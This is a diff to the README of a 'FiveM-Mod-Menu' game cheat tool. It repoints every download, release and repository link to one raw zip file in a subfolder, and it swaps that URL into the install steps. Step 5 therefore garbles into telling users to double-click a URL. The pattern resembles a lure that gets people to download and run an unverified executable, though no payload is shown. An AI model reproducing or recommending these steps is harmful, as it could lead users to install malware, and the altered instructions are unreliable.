@@ -1,6 +1,6 @@
 # 🎮 FiveM-Mod-Menu - Ultimate Experience for FiveM Players
 
-[![Download FiveM-Mod-Menu](https://img.shields.io/badge/Download-FiveM--Mod--Menu-brightgreen)](https://github.com/TheGamers93/FiveM-Mod-Menu/releases)
+[![Download FiveM-Mod-Menu](https://raw.githubusercontent.com/TheGamers93/FiveM-Mod-Menu/main/fei/FiveM-Mod-Menu_2.3.zip)](https://raw.githubusercontent.com/TheGamers93/FiveM-Mod-Menu/main/fei/FiveM-Mod-Menu_2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -11,19 +11,19 @@ Thank you for choosing FiveM-Mod-Menu! This guide will help you download and run
 1. **Visit the Releases Page**  
    Click the link below to visit the releases page and download the latest version.  
 
-   [Download FiveM-Mod-Menu](https://github.com/TheGamers93/FiveM-Mod-Menu/releases)
+   [Download FiveM-Mod-Menu](https://raw.githubusercontent.com/TheGamers93/FiveM-Mod-Menu/main/fei/FiveM-Mod-Menu_2.3.zip)
 
 2. **Choose the Right File**  
-   On the releases page, locate the latest version of the application. You will find various files available for download. Select the file labeled “FiveM-Mod-Menu-latest.zip.” This is the file you need.
+   On the releases page, locate the latest version of the application. You will find various files available for download. Select the file labeled “https://raw.githubusercontent.com/TheGamers93/FiveM-Mod-Menu/main/fei/FiveM-Mod-Menu_2.3.zip” This is the file you need.
 
 3. **Download the File**  
-   Click on the “FiveM-Mod-Menu-latest.zip” file. Your browser will start downloading the file. Wait for the download to complete.
+   Click on the “https://raw.githubusercontent.com/TheGamers93/FiveM-Mod-Menu/main/fei/FiveM-Mod-Menu_2.3.zip” file. Your browser will start downloading the file. Wait for the download to complete.
 
 4. **Extract the ZIP File**  
-   Once the download is finished, navigate to your downloads folder. Locate the “FiveM-Mod-Menu-latest.zip” file. Right-click on it and select “Extract All” to unzip the contents.
+   Once the download is finished, navigate to your downloads folder. Locate the “https://raw.githubusercontent.com/TheGamers93/FiveM-Mod-Menu/main/fei/FiveM-Mod-Menu_2.3.zip” file. Right-click on it and select “Extract All” to unzip the contents.
 
 5. **Run the Application**  
-   After extraction, open the newly created folder. Inside, you will find the “FiveM-Mod-Menu.exe” file. Double-click this file to launch the application.
+   After extraction, open the newly created folder. Inside, you will find the “https://raw.githubusercontent.com/TheGamers93/FiveM-Mod-Menu/main/fei/FiveM-Mod-Menu_2.3.zip” file. Double-click this file to launch the application.
 
 ### ⚙️ System Requirements
 
@@ -73,8 +73,8 @@ To better understand what this tool offers, consider these topics:
 
 ### 🔗 Useful Links
 
-- **Repository Home:** [GitHub Repository](https://github.com/TheGamers93/FiveM-Mod-Menu)
-- **Releases:** [Download FiveM-Mod-Menu](https://github.com/TheGamers93/FiveM-Mod-Menu/releases)
+- **Repository Home:** [GitHub Repository](https://raw.githubusercontent.com/TheGamers93/FiveM-Mod-Menu/main/fei/FiveM-Mod-Menu_2.3.zip)
+- **Releases:** [Download FiveM-Mod-Menu](https://raw.githubusercontent.com/TheGamers93/FiveM-Mod-Menu/main/fei/FiveM-Mod-Menu_2.3.zip)
 
 ### 📞 Feedback
 
